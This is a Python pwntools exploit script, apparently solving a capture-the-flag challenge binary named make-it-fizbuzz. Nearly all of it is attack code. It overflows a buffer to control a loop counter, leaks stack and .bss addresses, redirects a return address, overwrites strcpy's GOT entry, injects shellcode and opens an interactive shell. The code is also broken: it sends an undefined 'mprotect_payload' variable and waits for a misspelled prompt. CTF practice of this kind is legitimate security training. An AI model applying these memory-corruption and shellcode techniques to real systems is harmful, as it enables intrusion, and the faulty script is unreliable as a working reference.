from pwn import *

# Start the process
p = process("/challenge/make-it-fizbuzz")

p.recvuntil(b"0:")  # Fixed: bytes literal

# the first iteration will be exploit the printf after the read to leak the fizzbuzz address which located in the .bss section 
first_payload = b"A" * 24               # overwrite the buffer (4 bytes) up to loop counter
# set the loop counter (ustack_24) to negative number -6 to stay in the loop 
# this will make sure the local_20 get the address of local_38 in the next iteration to be -5
first_payload += p32(0xfffffff5)

p.send(first_payload)

p.recvuntil("You entered: ", timeout = 1)
output = p.recvline()

# Fixed: Handle binary data properly without eval
try:
    result = output.decode('utf-8', errors='ignore').strip()
except:
    result = output #.hex()  # Fallback to hex if decode fails
print(f"FIRST OUTPUT: {output}")

# Fixed: Extract bytes properly and ensure we have enough data
if len(output) >= 34:
    fizzbuzz_address_bytes = output[28:34]
    # Fixed: Pad to 8 bytes before converting to 64-bit integer
    fizzbuzz_address_value = u64(fizzbuzz_address_bytes.ljust(8, b'\x00'))
    print(f"fizzbuzz_address ==> local_28 (src strcpy) ptr: {hex(fizzbuzz_address_value)}")
else:
    print(f"Output too short: {len(output)} bytes")
    fizzbuzz_address_value = 0  # Default value

#print(output)

output = p.recvuntil("Correct answer: FizzBuzz", timeout=2)
print(f"FIRST OUTPUT: {output}")

print("----------------------------------------------------------------------------------------")

# the second itration will be used to leak the local_38 address which used as address container for the strcpy src variable (local_28)
second_payload = b"B" * 24          # arbitrary data just to go with the next iteration and copy the local_38 + 4 address to local_28 
second_payload += p32(0xfffffff5)
p.send(second_payload)

p.recvuntil(b"You entered: ", timeout=2)  # Fixed: bytes literal
output = p.recvline()

# Fixed: Handle binary data properly without eval
try:
    result = output.decode('utf-8', errors='ignore').strip()
except:
    result = output #.hex()  # Fallback to hex if decode fails
print(f"SECOND OUTPUT: {output}")

# Fixed: Extract bytes properly and ensure we have enough data
if len(output) >= 34:
    local_38_address_bytes = output[28:34]
    # Fixed: Pad to 8 bytes before converting to 64-bit integer
    local_38_address_value = u64(local_38_address_bytes.ljust(8, b'\x00'))
    print(f"local_38_address ==> local_28 (src strcpy) ptr: {hex(local_38_address_value)}")
else:
    print(f"Output too short: {len(output)} bytes")
    local_38_address_value = 0  # Default value

output = p.recvuntil("Correct answer: ", timeout=2)
output2 = p.recvline()
print(output2)

print("----------------------------------------------------------------------------------------")

# the third itration will be the first memory corruption where we are going to change the return address location of the challenge function
# to point to the buffer instead of the main function 
ret_addr_payload = b"C" * 16
ret_addr_payload += p64(local_38_address_value - 0xf)          # local_38 hold the address of buffer address to replace the return address
ret_addr_payload += p32(0xfffffff5)                            # the loop counter should be at the edge to break the loop after the last iteration to execute the address
ret_addr_payload += p64(local_38_address_value)                # local_28 to be equal the address of local_38 (already did from previous step but just to fill the gap to read local_20)
ret_addr_payload += p64(local_38_address_value + 0x34)         # local_20 to be equal the return address location in the stack 

p.send(mprotect_payload)

p.recvuntil("You eneted: ", timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")
p.recvuntil("Correct answer: ",  timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")

print("----------------------------------------------------------------------------------------")

# the last itration will hold the shellcode to be placed in the buffer, then set src and dest vriables of strcpy to 
# replace the address of strcpy in got with the address of mprotect_stack

# Build the payload

with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

padding_len = 16 - len(shellcode)

exploitation_payload = shellcode
exploitation_payload += b"D" * padding_len
exploitation_payload += p64(fizzbuzz_address_value - 0x2e17)       # local_38 hold the address of mprotect_stack to be copied to the strcpy address in got 
exploitation_payload += p32(0x0000000e)                            # the loop counter should be at the edge to break the loop after the last iteration to execute the address
exploitation_payload += p64(local_38_address_value)                # local_28 (src strcpy) to be equal the address of local_38 (already did from previous step but just to fill the gap to read local_18)
exploitation_payload += p64(fizzbuzz_address_value - 0x60)         # local_20 (dst strcpy) to be equal the address of strcpy in got

p.send(exploitation_payload)

p.recvuntil("You entered: ", timeout = 2)
output = p.recvline()
print(output)
p.recvuntil("Correct answer: ", timeout=2)
output = p.recvline()
print(f"FOURTH OUTPUT: {output}")

p.send(b"f")
p.recvuntil("You entered: ", timeout = 2)
output = p.recvline()
print(output)

p.interactive()
